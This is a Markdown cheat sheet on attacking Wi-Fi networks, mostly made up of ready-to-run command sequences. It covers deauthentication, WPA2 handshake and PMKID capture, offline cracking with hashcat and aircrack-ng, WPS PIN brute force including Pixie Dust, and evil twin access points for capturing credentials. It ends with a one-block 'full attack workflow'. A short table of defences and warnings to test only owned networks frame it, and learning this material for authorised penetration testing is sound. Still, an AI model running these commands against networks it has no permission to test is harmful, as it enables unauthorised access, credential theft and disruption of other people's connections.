# 📡 Wireless Security

> Wi-Fi attack techniques and defences. Practice on your own networks only.

---

## Wi-Fi Security Protocols

| Protocol | Year | Status | Vulnerability |
|----------|------|--------|--------------|
| WEP | 1997 | Broken | Weak RC4, crackable in minutes |
| WPA | 2003 | Weak | TKIP weaknesses |
| WPA2 | 2004 | Current standard | PMKID, handshake attacks |
| WPA3 | 2018 | Strongest | SAE replaces PSK — much harder to crack |
| WPS | — | Vulnerable | PIN brute-forceable (Pixie Dust) |

---

## Prerequisites — Hardware & Setup

You need a wireless adapter that supports **monitor mode** and **packet injection**.

### Recommended Adapters

- Alfa AWUS036ACH (dual-band, highly compatible)
- Alfa AWUS036NHA (2.4GHz, great range)
- TP-Link TL-WN722N v1 (cheap, popular)

> ⚠️ v2/v3 of TL-WN722N do NOT support injection — check before buying.

### Enable Monitor Mode

```bash
# Check your wireless interface name
ip a
iwconfig

# Enable monitor mode (aircrack-ng way)
sudo airmon-ng check kill     # Kill interfering processes
sudo airmon-ng start wlan0    # Enable monitor mode → creates wlan0mon

# Alternative (iw)
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### Stop Monitor Mode

```bash
sudo airmon-ng stop wlan0mon
sudo service NetworkManager restart
```

---

## WPA2 Handshake Attack

The most common attack — capture the 4-way handshake and crack it offline.

### Step 1: Scan for Networks

```bash
sudo airodump-ng wlan0mon
# Note the target's BSSID and channel
```

### Step 2: Capture Handshake

```bash
# Lock onto target network
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Keep this running and wait for a client to connect
# Or deauthenticate a client to force reconnect (Step 3)
```

### Step 3: Deauthentication Attack

```bash
# Force client to reconnect → triggers handshake capture
sudo aireplay-ng -0 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
# -0 = deauth, 10 = number of packets

# Check airodump for "WPA handshake: XX:XX:XX..." in top right
```

### Step 4: Crack the Handshake

```bash
# With aircrack-ng
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# With hashcat (faster — uses GPU)
# Convert .cap to hashcat format first
hcxpcapngtool capture-01.cap -o hash.hc22000
hashcat -m 22000 hash.hc22000 rockyou.txt
```

---

## PMKID Attack

Newer attack — no need to wait for a client. Works against WPA2.

```bash
# Capture PMKID
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool capture.pcapng -o pmkid.hc22000

# Crack
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

---

## WPS Attacks

WPS (Wi-Fi Protected Setup) has a vulnerable PIN system.

### Reaver — WPS PIN Brute Force

```bash
# Scan for WPS-enabled networks
sudo wash -i wlan0mon

# Attack
sudo reaver -i wlan0mon -b <BSSID> -vv
sudo reaver -i wlan0mon -b <BSSID> -vv --no-associate
```

### Pixie Dust Attack (Faster)

```bash
sudo reaver -i wlan0mon -b <BSSID> -vv -K 1
# Works on many routers in seconds if the router is vulnerable
```

---

## Evil Twin / Rogue AP

Create a fake access point that mimics a real one to capture credentials.

```bash
# Using hostapd-wpe (WPA Enterprise evil twin)
hostapd-wpe hostapd-wpe.conf

# Using airbase-ng
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Using Wifiphisher (full framework)
sudo wifiphisher -aI wlan0mon -jI wlan1mon -p wifi_connect
```

---

## Network Monitoring & Analysis

```bash
# Capture all traffic on network (monitor mode)
sudo airodump-ng wlan0mon

# Capture specific network traffic
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w traffic wlan0mon

# Analyse with Wireshark
wireshark traffic-01.cap

# Filter in Wireshark:
# http          → HTTP traffic
# dns           → DNS queries
# eapol         → WPA handshake packets
# wlan.fc.type_subtype == 0x08  → Beacon frames
```

---

## Wireless Reconnaissance

```bash
# Scan all networks (passive)
sudo airodump-ng wlan0mon

# Active scan with kismet
sudo kismet -c wlan0mon

# NetworkMiner (Windows/Linux) — extract files from captures
```

---

## Securing Wireless Networks

| Measure | Details |
|---------|---------|
| Use WPA3 | Or WPA2-AES minimum — never WEP/WPA |
| Disable WPS | Always disable — major weakness |
| Strong passphrase | 20+ random characters |
| Hide SSID | Minor deterrent — not real security |
| MAC filtering | Easy to bypass — minimal value |
| Guest network | Isolate IoT and guest devices |
| Monitor for rogues | Detect evil twins on your network |

---

## Quick Reference

```bash
# Full attack workflow
sudo airmon-ng start wlan0                          # Enable monitor mode
sudo airodump-ng wlan0mon                           # Scan networks
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  # Lock on target
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon  # Deauth clients
aircrack-ng capture-01.cap -w rockyou.txt           # Crack handshake
```

---

> ⚠️ Only attack networks you own or have explicit written permission to test.
